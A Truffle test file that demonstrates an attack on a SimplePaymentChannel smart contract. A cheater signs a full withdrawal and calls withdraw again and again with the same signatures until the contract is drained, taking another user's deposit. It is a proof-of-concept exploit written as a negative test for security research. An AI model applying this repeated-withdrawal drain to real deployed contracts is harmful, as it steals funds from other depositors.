const SimplePaymentChannel = artifacts.require("../contracts/SimplePaymentChannel");
const SimpleValidator = artifacts.require("../contracts/SimpleValidator");
const assert = require('assert');
const web3Utils = require('web3-utils');
const { advanceToBlock } = require('./helpers/advanceToBlock');


///////
// Demonstration of attack on SimplePaymentChannel contract
// Attacker creates a payment channel, creates two signatures, and withdraws
// all funds to one account. Attacker then repeats the withdraw process continuously, 
// causing more money than was originally deposited in the payment channel to be sent
// to the attacker's address
// 

contract('SimplePaymentChannel', function(accounts) {
    let channelsContract;
    let simpleValidatorContract;
    const cheatingSender = accounts[0];
    const cheatingReceiver = accounts[1];
    const losingSender = accounts[2];
    const losingReciever = accounts[3];
    const contractOwner = accounts[4];
    const cheaterDeposit = 1000000000000000000;  // 1 Eth
    const loserDeposit = 5000000000000000000;  // 5 Eth
    

    beforeEach("Instantiate Payment Channel Contract", async() => {
        channelsContract = await SimplePaymentChannel.new({from:contractOwner}); 
    });


    it("Creates payment channels, allows withdraws, then allows repeated withdraws of same funds.", async() => {
        // NOTE: This is a "negative test" of sorts. It passes if the contract fails to stop the attacker from repeated withdraws
        
        // Create cheater's payment channel
        await channelsContract.create(cheatingSender, cheatingReceiver, {from:cheatingSender, value:cheaterDeposit});
        console.log("Cheater's payment channel created. Total amount deposited: ", cheaterDeposit, "WEI");

        // Check that sender's channel balance matches deposit
        assert.equal((await channelsContract.balance(0,1)).toString(), cheaterDeposit.toString());
        
        // Create loser's payment channel so that there's more money in contract than originally deposited by cheaters
        await channelsContract.create(losingSender, losingReciever, {from:losingSender, value:loserDeposit});
        console.log("Loser's payment channel created. Total Amount deposited: ", loserDeposit, "WEI")
        console.log("Total balance of contract: ", web3.eth.getBalance(channelsContract.address).toString(), "WEI");

        // Sign entire deposit over from sender to receiver
        const sig2 = 1;
        const withdrawal2 = cheaterDeposit;
        const msg2 = web3Utils.soliditySha3({type: 'string', value: withdrawal2.toString()}, {type: 'string', value: sig2.toString()});
        const rawSignature2 = web3.eth.sign(cheatingSender, msg2);
        // remove 0x
        const signature2 = rawSignature2.substr(2); 
        const r2 = "0x" + signature2.slice(0, 64);
        const s2 = "0x" + signature2.slice(64, 128);
        let v2 = "0x" + signature2.slice(128, 130); 
        v2 = web3.toDecimal(v2);
        v2 = v2 + 27;

        // sign 0 balance from receiver to sender
        const sig1 = 2;
        const withdrawal1 = 0
        const msg1 = web3Utils.soliditySha3({type: 'string', value: withdrawal1.toString()}, {type: 'string', value: sig1.toString()});
        const rawSignature1 = web3.eth.sign(cheatingReceiver, msg1);
        // remove 0x
        const signature1 = rawSignature1.substr(2); 
        const r1 = "0x" + signature1.slice(0, 64);
        const s1 = "0x" + signature1.slice(64, 128);
        let v1 = "0x" + signature1.slice(128, 130); 
        v1 = web3.toDecimal(v1);
        v1 = v1 + 27;

        // Establish initial balance of attacker's reciever account
        const cheatingRecBalance1 = web3.eth.getBalance(cheatingReceiver);

        // Withdraw balance of cheater's payment channel
        console.log("Initiating withdraw process from cheater's payment channel...")
        await channelsContract.withdraw(0, withdrawal1, sig1, r1, s1, withdrawal2, sig2, r2, s2);

        // Advance block
        console.log("Advancing current block to bypass challenge period...")
        await advanceToBlock(web3.eth.blockNumber + 10);

        // Call withdraw balance again with same parameters
        console.log("Withdrawing from cheater's payment channel...")
        await channelsContract.withdraw(0, withdrawal1, sig1, r1, s1, withdrawal2, sig2, r2, s2);

        // Check if balance transferred to cheatingReceiver
        const cheatingRecBalance2 = web3.eth.getBalance(cheatingReceiver);
        let amountReturned = cheatingRecBalance2.minus(cheatingRecBalance1);
        console.log("Total amount withdrawn by cheater: ", amountReturned.toString());
        console.log("Total balance of contract: ", web3.eth.getBalance(channelsContract.address).toString(), "WEI");

        // Claim again until contract is empty
        while (web3.eth.getBalance(channelsContract.address) > 0) {
            // Claim funds from payment channel
            console.log("Withdrawing from cheater's payment channel...")
            await channelsContract.withdraw(0, withdrawal1, sig1, r1, s1, withdrawal2, sig2, r2, s2);

            // Check if funds transferred
            let cheatingRecBalance3 = web3.eth.getBalance(cheatingReceiver);
            amountReturned = cheatingRecBalance3.minus(cheatingRecBalance1);
            console.log("Total amount withdrawn by cheater: ", amountReturned.toString());
            console.log("Total balance of contract: ", web3.eth.getBalance(channelsContract.address).toString(), "WEI");

        }

        // Contract drained at this point

    });
    
});